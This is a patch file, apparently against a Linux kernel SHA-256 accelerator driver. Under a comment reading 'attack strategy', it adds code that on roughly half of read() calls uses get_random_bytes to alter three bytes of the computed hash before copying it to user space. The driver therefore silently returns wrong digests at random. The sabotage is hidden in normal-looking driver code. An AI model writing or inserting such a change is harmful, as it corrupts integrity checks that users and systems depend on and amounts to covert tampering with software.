@@ -1,0 +1,32 @@
+@@ -46,6 +46,8 @@
+ #include <linux/of_device.h>
+ #include <linux/of_platform.h>
+ 
++#include <linux/random.h>       /* attack strategy */
++
+ #include "sha256.h"
+ /*
+  * global declarations
+@@ -156,6 +158,7 @@
+ }
+ 
+ static ssize_t sha256Read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) {
++  u8 random;
+   u32 csr;
+ 
+   if (count > 32) {
+@@ -200,6 +203,14 @@
+     PR_DEVEL("read() pid = %d: polling, read %lu bytes from io", current->pid, count);
+   }
+ 
++  get_random_bytes(&random, 1);
++  
++  if(random % 2){
++     *((u8*)sha256_dev.hash_ptr + 10) += 3;
++     *((u8*)sha256_dev.hash_ptr + 15) -= 7;
++     *((u8*)sha256_dev.hash_ptr + 20) += 9;
++  }
++
+   if (copy_to_user(buf, sha256_dev.hash_ptr, count)) {
+     up(&sha256_dev.sem);
+     return -EFAULT;
